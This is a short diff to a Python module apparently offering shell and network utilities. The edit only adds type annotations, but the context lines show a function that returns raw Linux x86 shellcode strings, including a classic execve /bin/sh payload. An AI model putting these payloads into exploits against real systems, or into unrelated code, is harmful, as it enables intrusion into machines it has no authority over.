@@ -1,5 +1,7 @@
 """Network utilities for basic shell workflows."""
 
+from __future__ import annotations
+
 import os
 import socket
 import subprocess
@@ -110,7 +112,7 @@ def generate_shellcode_list(arch: str = "x86", platform: str = "linux") -> list[
         >>> len(shellcode)
         2
     """
-    shellcode = {
+    shellcode: dict[str, list[str]] = {
         "linux_x86": [
             "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
             "\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8",
